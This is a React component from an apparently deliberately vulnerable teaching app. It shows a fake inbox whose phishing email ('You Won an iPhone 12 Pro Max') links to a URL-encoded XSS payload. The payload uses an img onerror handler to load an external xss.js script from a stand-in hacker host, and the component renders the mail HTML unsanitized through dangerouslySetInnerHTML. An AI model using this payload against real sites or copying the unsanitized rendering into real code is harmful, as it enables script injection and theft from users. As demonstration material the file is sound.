import React from 'react';
import Typography from 'antd/lib/typography'
import Collapse from 'antd/lib/collapse'
import Space from 'antd/lib/space'

const mails = [
  {
    from: 'bong_hacker@localhost.com',
    title: 'You Won an iPhone 12 Pro Max',
    html_body: `
      <h1>Congratulation! you won an iPhone 12 Pro Max</h1>
      <p>Dear Sir,</p>
      <p>
        We are happy to tell you that you are luckily selected to win an new iPhone 12 Pro Max. 
        To get the iPhone, click 
        <a href="http://localhost:3000/faq?q=%3Cimg%20src%3D%22%23%22%20onerror%3D%22const%20a%3Ddocument.createElement(%27script%27)%3Ba.src%3D%27http%3A%2F%2Flocalhost%3A8001%2Fhacker.com%2Fxss.js%27%3Bdocument.body.appendChild(a)%3B%22%20%2F%3Ehttp://localhost:3000/faq?q=%3Cimg%20src%3D%22%23%22%20onerror%3D%22const%20a%3Ddocument.createElement(%27script%27)%3Ba.src%3D%27http%3A%2F%2Flocalhost%3A8001%2Fhacker.com%2Fxss.js%27%3Bdocument.body.appendChild(a)%3B%22%20%2F%3E" target="_blank" ref="noopener noreferrer">here</a> 
        and give us your shipping address and we will send you the iPhone 12 Pro Max. ^^
      </p>
      <img width="400px" src="https://mms.businesswire.com/media/20201013006005/en/829823/23/iPhone12Pro-hero-pacific-blue-2Up-angled.jpg" />
      <br/>
      <br/>
      <p>Best Wish,</p>
      <i>Bong Hacker</i>  
    `
  },
  {
    from: 'bong_hacker@localhost.com',
    title: 'For what it is made?',
    html_body: 'As I mentioned it is for demonstration purpose only. Do not use it for real since there are a lot of security bugs on this application.'
  },
]


export default function Faq() {
  return (
    <Space direction="vertical" style={{width: '100%'}}>
      <Typography.Title level={5}>Fake Inbox</Typography.Title>
      <p>Let assume this is your mail inbox</p>
      <Collapse accordion>
        {mails.map((mail, index) => 
          <Collapse.Panel header={`From: ${mail.from} / Title: ${mail.title}`} key={index+1}>
            <div style={{width: '100%'}} dangerouslySetInnerHTML={{__html: mail.html_body}} />
          </Collapse.Panel>
        )}
      </Collapse>
      <p></p>
    </Space>
  )
} 